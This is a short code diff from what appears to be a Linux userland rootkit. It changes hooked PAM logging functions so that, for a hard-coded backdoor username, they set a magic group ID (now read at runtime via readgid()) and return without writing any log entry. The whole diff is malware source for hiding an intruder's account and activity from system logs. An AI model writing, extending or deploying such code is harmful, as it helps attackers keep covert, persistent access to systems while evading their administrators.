@@ -8,7 +8,7 @@ void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...){
 
     if(!strcmp(user, BD_UNAME)){
         hook(CSETGID);
-        call(CSETGID, MAGIC_GID);
+        call(CSETGID, readgid());
         return;
     }
 
@@ -26,7 +26,7 @@ void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_lis
 
     if(!strcmp(user, BD_UNAME)){
         hook(CSETGID);
-        call(CSETGID, MAGIC_GID);
+        call(CSETGID, readgid());
         return;
     }
 
